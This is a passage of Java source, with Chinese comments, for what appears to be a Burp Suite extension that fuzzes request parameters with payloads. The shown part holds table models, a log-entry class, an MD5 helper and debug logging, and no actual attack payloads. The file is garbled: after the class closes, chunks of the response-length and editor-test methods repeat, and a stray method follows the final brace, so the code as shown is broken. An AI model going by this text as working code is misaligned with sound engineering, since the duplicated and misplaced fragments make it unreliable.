                                    responseViewer.setResponse(null);
                                } catch (Exception clearEx) {
                                    api.logging().logToOutput("无法清空响应查看器: " + clearEx.getMessage());
                                }
                            }
                        } catch (Exception e) {
                            api.logging().logToOutput("设置请求响应查看器时出错: " + e.getMessage());
                            e.printStackTrace();
                        }
                    });
                } else {
                    api.logging().logToOutput("警告: 选中条目的requestResponse为null");
                }
            }
            super.changeSelection(row, col, toggle, extend);
        }
    }

    // 左侧表格的TableModel
    private class LeftTableModel extends AbstractTableModel {
        @Override
        public int getRowCount() {
            return log.size();
        }

        @Override
        public int getColumnCount() {
            return 5;
        }

        @Override
        public String getColumnName(int columnIndex) {
            switch (columnIndex) {
                case 0: return "#";
                case 1: return "来源";
                case 2: return "URL";
                case 3: return "返回包长度";
                case 4: return "状态";
                default: return "";
            }
        }

        @Override
        public Class<?> getColumnClass(int columnIndex) {
            return String.class;
        }

        @Override
        public Object getValueAt(int rowIndex, int columnIndex) {
            if (rowIndex >= log.size()) return "";
            LogEntry logEntry = log.get(rowIndex);

            switch (columnIndex) {
                case 0:
                    return String.valueOf(logEntry.id);
                case 1:
                    // 转换工具来源
                    if (logEntry.tool == 4) return "Proxy";
                    else if (logEntry.tool == 16) return "Scanner";
                    else if (logEntry.tool == 32) return "Intruder";
                    else if (logEntry.tool == 64) return "Repeater";
                    else if (logEntry.tool == 1024) return "Menu";
                    else return String.valueOf(logEntry.tool);
                case 2:
                    return logEntry.url;
                case 3:
                    return String.valueOf(logEntry.responseLength);
                case 4:
                    return logEntry.state;
                default:
                    return "";
            }
        }
    }

    // 内部类：payload表格
    private class PayloadTable extends JTable {
        public PayloadTable(TableModel tableModel) {
            super(tableModel);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend) {
            // 显示payload表格选中行的详细信息
            LogEntry logEntry = null;
            synchronized (log3) {
                if (row >= 0 && row < log3.size()) {
                    logEntry = log3.get(row);
                }
            }
            
            if (logEntry != null) {
                final LogEntry selectedEntry = logEntry;
                api.logging().logToOutput("PayloadTable选择: 行=" + row + ", 参数=" + selectedEntry.parameter + ", payload=" + selectedEntry.value);
                
                // 设置消息查看器内容
                if (selectedEntry.requestResponse != null) {
                    boolean hasReq = selectedEntry.requestResponse.request() != null;
                    boolean hasResp = selectedEntry.requestResponse.response() != null;
                    int respLen = hasResp ? selectedEntry.requestResponse.response().body().length() : 0;
                    api.logging().logToOutput("PayloadTable验证: 请求=" + hasReq + ", 响应=" + hasResp + ", 长度=" + respLen);
                    
                    SwingUtilities.invokeLater(() -> {
                        try {
                            // 验证编辑器是否可用
                            if (requestViewer == null || responseViewer == null) {
                                api.logging().logToOutput("警告: 请求或响应编辑器为null");
                                return;
                            }
                            
                            // 设置请求
                            if (selectedEntry.requestResponse.request() != null) {
                                try {
                                    api.logging().logToOutput("PayloadTable: 正在设置请求到编辑器...");
                                    requestViewer.setRequest(selectedEntry.requestResponse.request());
                                    api.logging().logToOutput("PayloadTable: 请求设置成功");
                                } catch (Exception e) {
                                    api.logging().logToOutput("PayloadTable: 设置请求失败: " + e.getMessage());
                                    e.printStackTrace();
                                }
                            } else {
                                api.logging().logToOutput("警告: 选中条目的请求为null");
                            }
                            
                            // 设置响应
                            if (selectedEntry.requestResponse.response() != null) {
                                try {
                                    HttpResponse response = selectedEntry.requestResponse.response();
                                    api.logging().logToOutput("PayloadTable: 正在设置响应到编辑器...");
                                    
                                    // 方法1：直接设置响应
                                    responseViewer.setResponse(response);
                                    api.logging().logToOutput("PayloadTable: 响应设置成功");
                                    
                                    // 方法2：强制刷新UI组件
                                    Component responseComponent = responseViewer.uiComponent();
                                    if (responseComponent != null) {
                                        responseComponent.revalidate();
                                        responseComponent.repaint();
                                        api.logging().logToOutput("PayloadTable: 响应编辑器UI已刷新");
                                        
                                        // 延迟再次设置，确保渲染正确
                                        SwingUtilities.invokeLater(() -> {
                                            try {
                                                responseViewer.setResponse(response);
                                                api.logging().logToOutput("PayloadTable: 延迟响应设置完成");
                                            } catch (Exception e2) {
                                                api.logging().logToOutput("PayloadTable: 延迟设置响应失败: " + e2.getMessage());
                                            }
                                        });
                                    } else {
                                        api.logging().logToOutput("警告: 响应查看器UI组件为null，无法刷新");
                                    }
                                    
                                } catch (Exception setEx) {
                                    api.logging().logToOutput("PayloadTable: 设置响应时出错: " + setEx.getMessage());
                                    setEx.printStackTrace();
                                }
                            } else {
                                api.logging().logToOutput("警告: 选中条目的响应为null");
                                // 尝试清空响应查看器
                                try {
                                    responseViewer.setResponse(null);
                                } catch (Exception clearEx) {
                                    api.logging().logToOutput("无法清空响应查看器: " + clearEx.getMessage());
                                }
                            }
                        } catch (Exception e) {
                            api.logging().logToOutput("设置请求响应查看器时出错: " + e.getMessage());
                            e.printStackTrace();
                        }
                    });
                } else {
                    api.logging().logToOutput("警告: 选中条目的requestResponse为null");
                }
            }
            super.changeSelection(row, col, toggle, extend);
        }
    }

    // 内部类：表格模型
    private class MyModel extends AbstractTableModel {
        @Override
        public int getRowCount() {
            return log3.size();
        }

        @Override
        public int getColumnCount() {
            return 6;
        }

        @Override
        public String getColumnName(int columnIndex) {
            switch (columnIndex) {
                case 0: return "参数";
                case 1: return "payload";
                case 2: return "返回包长度";
                case 3: return "变化";
                case 4: return "用时";
                case 5: return "响应码";
                default: return "";
            }
        }

        @Override
        public Class<?> getColumnClass(int columnIndex) {
            return String.class;
        }

        @Override
        public Object getValueAt(int rowIndex, int columnIndex) {
            if (rowIndex >= log3.size()) return "";
            LogEntry logEntry = log3.get(rowIndex);
            switch (columnIndex) {
                case 0: return logEntry.parameter;
                case 1: return logEntry.value;
                case 2: return logEntry.responseLength;
                case 3: return logEntry.change;
                case 4: return logEntry.times;
                case 5: return logEntry.responseCode;
                default: return "";
            }
        }
    }

    // 内部类：日志条目
    private static class LogEntry {
        final int id;
        final int tool;
        final HttpRequestResponse requestResponse;
        final String url;
        final String parameter;
        final String value;
        final String change;
        final String dataMd5;
        final int times;
        final int responseCode;
        final int responseLength;
        String state;
        boolean hasError; // 是否检测到报错信息
        boolean hasAnyError; // 该原始请求是否有任何报错信息

        LogEntry(int id, int tool, HttpRequestResponse requestResponse, String url,
                String parameter, String value, String change, String dataMd5,
                int times, String state, int responseCode) {
            this.id = id;
            this.tool = tool;
            this.requestResponse = requestResponse;
            this.url = url;
            this.parameter = parameter;
            this.value = value;
            this.change = change;
            this.dataMd5 = dataMd5;
            this.times = times;
            this.state = state;
            this.responseCode = responseCode;
            this.responseLength = requestResponse != null && requestResponse.response() != null ?
                requestResponse.response().body().length() : 0;
            this.hasError = false;
            this.hasAnyError = false;
        }

        public String setState(String state) {
            this.state = state;
            return this.state;
        }
    }

    // 内部类：请求MD5
    private static class RequestMd5 {
        final String md5Data;

        RequestMd5(String md5Data) {
            this.md5Data = md5Data;
        }
    }

    // 工具方法：MD5计算
    public static String MD5(String key) {
        char hexDigits[] = {
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'
        };
        try {
            byte[] btInput = key.getBytes();
            MessageDigest mdInst = MessageDigest.getInstance("MD5");
            mdInst.update(btInput);
            byte[] md = mdInst.digest();
            int j = md.length;
            char str[] = new char[j * 2];
            int k = 0;
            for (int i = 0; i < j; i++) {
                byte byte0 = md[i];
                str[k++] = hexDigits[byte0 >>> 4 & 0xf];
                str[k++] = hexDigits[byte0 & 0xf];
            }
            return new String(str);
        } catch (Exception e) {
            return null;
        }
    }

    // 调试方法：打印当前状态
    private void debugCurrentState(String context, String requestMd5Id) {
        api.logging().logToOutput("=== 调试状态 [" + context + "] ===");
        api.logging().logToOutput("请求MD5: " + requestMd5Id);
        api.logging().logToOutput("当前选中MD5: " + dataMd5Id);
        api.logging().logToOutput("线程: " + Thread.currentThread().getName());
        
        // 统计各个列表的大小
        api.logging().logToOutput("log大小: " + log.size());
        api.logging().logToOutput("log2大小: " + log2.size());
        api.logging().logToOutput("log3大小: " + log3.size());
        
        // 统计该请求的测试结果数量
        int testCount = 0;
        synchronized (log2) {
            for (LogEntry entry : log2) {
                if (entry.dataMd5.equals(requestMd5Id)) {
                    testCount++;
                }
            }
        }
        api.logging().logToOutput("该请求的测试结果数量: " + testCount);
        
        // 检查原始响应长度映射
        Integer originalLen = originalResponseLengths.get(requestMd5Id);
        api.logging().logToOutput("原始响应长度: " + originalLen);
        
        api.logging().logToOutput("=== 调试状态结束 ===");
    }

    // 创建完整的HttpRequestResponse对象，确保编辑器能正确渲染
    private HttpRequestResponse ensureCompleteRequestResponse(HttpRequestResponse original) {
        if (original == null) {
            api.logging().logToOutput("原始HttpRequestResponse为null");
            return null;
        }
        
        try {
            // 验证请求和响应的完整性
            HttpRequest request = original.request();
            HttpResponse response = original.response();
            
            if (request == null) {
                api.logging().logToOutput("警告: HttpRequest为null，无法修复");
                return original;
            }
            
            if (response == null) {
                api.logging().logToOutput("警告: HttpResponse为null，无法修复");
                return original;
            }
            
            // 验证请求和响应的内容
            String requestString = request.toString();
            byte[] responseBytes = response.toByteArray().getBytes();
            
            if (requestString == null || requestString.isEmpty()) {
                api.logging().logToOutput("警告: 请求内容为空");
                return original;
            }
            
            if (responseBytes == null || responseBytes.length == 0) {
                api.logging().logToOutput("警告: 响应内容为空");
                return original;
            }
            
            // 如果一切正常，返回原始对象
            api.logging().logToOutput("HttpRequestResponse验证通过，请求长度=" + requestString.length() + 
                                    ", 响应长度=" + responseBytes.length);
            return original;
            
        } catch (Exception e) {
            api.logging().logToOutput("验证HttpRequestResponse时出错: " + e.getMessage());
            return original;
        }
    }
    private int calculateResponseLength(HttpResponse response, String context) {
        if (response == null) {
            return 0;
        }
        
        String contentLengthHeader = response.headerValue("Content-Length");
        int actualBodyLength = response.body().length();
        int responseLength;
        
        if (contentLengthHeader != null && !contentLengthHeader.trim().isEmpty()) {
            try {
                int headerLength = Integer.parseInt(contentLengthHeader.trim());
                responseLength = headerLength; // 优先使用Content-Length头
                
                // 检查一致性，如果不一致则记录警告但仍使用Content-Length
                if (headerLength != actualBodyLength) {
                    api.logging().logToOutput(context + "警告：Content-Length头(" + headerLength + 
                                            ")与实际body长度(" + actualBodyLength + ")不一致，使用Content-Length");
                }
            } catch (NumberFormatException e) {
                responseLength = actualBodyLength;
                api.logging().logToOutput(context + "Content-Length头解析失败，使用实际body长度: " + actualBodyLength);
            }
        } else {
            responseLength = actualBodyLength;
            api.logging().logToOutput(context + "无Content-Length头，使用实际body长度: " + actualBodyLength);
        }
        
        return responseLength;
    }

    // 测试编辑器功能的方法
    private void testEditorFunctionality() {
        api.logging().logToOutput("=== 测试编辑器功能 ===");
        
        try {
            if (requestViewer == null || responseViewer == null) {
                api.logging().logToOutput("编辑器为null，无法测试");
                return;
            }
            
            // 测试UI组件
            Component reqComponent = requestViewer.uiComponent();
            Component respComponent = responseViewer.uiComponent();
            
            api.logging().logToOutput("请求编辑器UI组件: " + (reqComponent != null ? "OK" : "NULL"));
            api.logging().logToOutput("响应编辑器UI组件: " + (respComponent != null ? "OK" : "NULL"));
            
            if (reqComponent != null) {
                api.logging().logToOutput("请求编辑器组件类型: " + reqComponent.getClass().getName());
                api.logging().logToOutput("请求编辑器组件可见: " + reqComponent.isVisible());
                api.logging().logToOutput("请求编辑器组件大小: " + reqComponent.getSize());
            }
            
            if (respComponent != null) {
                api.logging().logToOutput("响应编辑器组件类型: " + respComponent.getClass().getName());
                api.logging().logToOutput("响应编辑器组件可见: " + respComponent.isVisible());
                api.logging().logToOutput("响应编辑器组件大小: " + respComponent.getSize());
            }
            
            // 尝试创建一个简单的测试请求
            try {
                HttpRequest testRequest = HttpRequest.httpRequest("GET / HTTP/1.1\r\nHost: example.com\r\n\r\n");
                if (testRequest != null) {
                    api.logging().logToOutput("测试请求创建成功");
                    requestViewer.setRequest(testRequest);
                    api.logging().logToOutput("测试请求设置成功");
                } else {
                    api.logging().logToOutput("测试请求创建失败");
                }
            } catch (Exception e) {
                api.logging().logToOutput("测试请求处理失败: " + e.getMessage());
            }
            
        } catch (Exception e) {
            api.logging().logToOutput("编辑器功能测试异常: " + e.getMessage());
            e.printStackTrace();
        }
        
        api.logging().logToOutput("=== 编辑器功能测试完成 ===");
    }
}
                // 检查一致性，如果不一致则记录警告但仍使用Content-Length
                if (headerLength != actualBodyLength) {
                    api.logging().logToOutput(context + "警告：Content-Length头(" + headerLength + 
                                            ")与实际body长度(" + actualBodyLength + ")不一致，使用Content-Length");
                }
            } catch (NumberFormatException e) {
                responseLength = actualBodyLength;
                api.logging().logToOutput(context + "Content-Length头解析失败，使用实际body长度: " + actualBodyLength);
            }
        } else {
            responseLength = actualBodyLength;
            api.logging().logToOutput(context + "无Content-Length头，使用实际body长度: " + actualBodyLength);
        }
        
        return responseLength;
    }

    // 测试编辑器功能的方法
    private void testEditorFunctionality() {
        api.logging().logToOutput("=== 测试编辑器功能 ===");
        
        try {
            if (requestViewer == null || responseViewer == null) {
                api.logging().logToOutput("编辑器为null，无法测试");
                return;
            }
            
            // 测试UI组件
            Component reqComponent = requestViewer.uiComponent();
            Component respComponent = responseViewer.uiComponent();
            
            api.logging().logToOutput("请求编辑器UI组件: " + (reqComponent != null ? "OK" : "NULL"));
            api.logging().logToOutput("响应编辑器UI组件: " + (respComponent != null ? "OK" : "NULL"));
            
            if (reqComponent != null) {
                api.logging().logToOutput("请求编辑器组件类型: " + reqComponent.getClass().getName());
                api.logging().logToOutput("请求编辑器组件可见: " + reqComponent.isVisible());
                api.logging().logToOutput("请求编辑器组件大小: " + reqComponent.getSize());
            }
            
            if (respComponent != null) {
                api.logging().logToOutput("响应编辑器组件类型: " + respComponent.getClass().getName());
                api.logging().logToOutput("响应编辑器组件可见: " + respComponent.isVisible());
                api.logging().logToOutput("响应编辑器组件大小: " + respComponent.getSize());
            }
            
            // 尝试创建一个简单的测试请求
            try {
                HttpRequest testRequest = HttpRequest.httpRequest("GET / HTTP/1.1\r\nHost: example.com\r\n\r\n");
                if (testRequest != null) {
                    api.logging().logToOutput("测试请求创建成功");
                    requestViewer.setRequest(testRequest);
                    api.logging().logToOutput("测试请求设置成功");
                } else {
                    api.logging().logToOutput("测试请求创建失败");
                }
            } catch (Exception e) {
                api.logging().logToOutput("测试请求处理失败: " + e.getMessage());
            }
            
        } catch (Exception e) {
            api.logging().logToOutput("编辑器功能测试异常: " + e.getMessage());
            e.printStackTrace();
        }
        
        api.logging().logToOutput("=== 编辑器功能测试完成 ===");
    }

    /**
     * 创建备用面板
     */
    private Component createFallbackPanel(String message) {
        JTextArea fallbackArea = new JTextArea(message + "\n\n可能的原因：\n1. Burp Suite版本不兼容\n2. 权限问题\n3. 插件加载时机问题\n\n请检查Burp Suite输出面板的错误信息");
        fallbackArea.setEditable(false);
        fallbackArea.setFont(new Font("Monospaced", Font.PLAIN, 12));
        return new JScrollPane(fallbackArea);
    }
}
    
    // 初始化payload分组
    private void initializePayloadGroups() {
        // 简化的payload组初始化
        api.logging().logToOutput("Payload组初始化完成");
    }